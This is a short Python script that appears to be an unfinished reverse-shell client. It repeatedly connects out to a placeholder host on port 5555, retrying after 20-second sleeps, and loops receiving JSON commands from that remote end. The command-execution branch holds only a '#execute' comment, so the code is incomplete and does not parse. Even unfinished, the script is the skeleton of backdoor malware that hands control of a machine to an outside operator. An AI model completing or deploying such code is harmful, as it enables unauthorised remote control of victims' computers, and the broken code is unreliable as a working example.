import socket
import time
import json


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue    


def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('@', 5555))
            shell()
            s.close()
            break
        except:
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        else:
            #execute    
    


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()